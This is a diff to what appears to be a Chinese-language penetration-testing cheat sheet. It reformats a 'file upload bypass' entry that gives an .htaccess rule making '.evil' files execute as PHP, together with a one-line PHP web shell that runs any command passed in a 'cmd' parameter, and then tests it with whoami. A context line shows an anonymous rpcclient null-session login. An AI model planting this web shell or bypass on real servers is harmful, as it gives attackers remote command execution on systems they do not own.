@@ -341,14 +341,12 @@ rpcclient -U '' -N IP
 ```
 
 16. **文件上传绕过**
-```bash
-vim .htaccess
-AddType application/x-httpd-php .evil
-# 尝试上传
-vim shell.php.evil
-<pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>
-# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
-```
+`vim .htaccess`
+`AddType application/x-httpd-php .evil`
+`# 尝试上传`
+`vim shell.php.evil`
+`<pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>`
+`# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功`
 17. **ILSpy工具**
 ```bash
 # 一款逆向工具，可以寻找源码中的信息
